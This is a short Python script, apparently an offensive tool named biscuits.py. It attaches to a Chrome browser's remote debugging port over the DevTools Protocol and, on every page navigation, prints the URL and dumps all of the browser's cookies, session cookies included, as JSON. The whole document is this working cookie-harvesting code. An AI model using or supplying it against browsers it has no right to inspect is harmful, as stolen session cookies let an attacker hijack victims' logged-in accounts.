from patchright.async_api import async_playwright
from json import dumps
import asyncio
import sys

if len(sys.argv) < 2:
    print('[-] Usage: python3 biscuits.py <DEBUGPORT>')
    sys.exit(1)
else:
    PORT = int(sys.argv[1])

CDP_ENDPOINT = f"http://127.0.0.1:{PORT}"

async def run():
    async with async_playwright() as p:
        print(f'[+] Attempting to connect to: {CDP_ENDPOINT}');
        try:
            browser = await p.chromium.connect_over_cdp(CDP_ENDPOINT)
            context = browser.contexts[0] if browser.contexts else await browser.new_context()
            print('[+] Successfully connected to Chrome!');
        except Exception as e:
            print(f'[-] Error while connecting to the browser: {e}')

        async def handle_page(page):
            async def on_navigate(frame):
                if frame == page.main_frame:
                    print('--')
                    url = frame.url
                    print('[+] URL: ' + url)
                    cookies = await context.cookies()
                    print('[+] Browser cookies ('+str(len(cookies))+'):')
                    print(dumps(cookies))
            page.on("framenavigated", on_navigate)

        # Attach to all existing pages
        for page in context.pages:
            await handle_page(page)

        # Attach to future pages
        context.on("page", handle_page)

        print("Listening for navigations... Press Ctrl+C to exit.")
        await asyncio.Future()  # Keep the script running

asyncio.run(run())
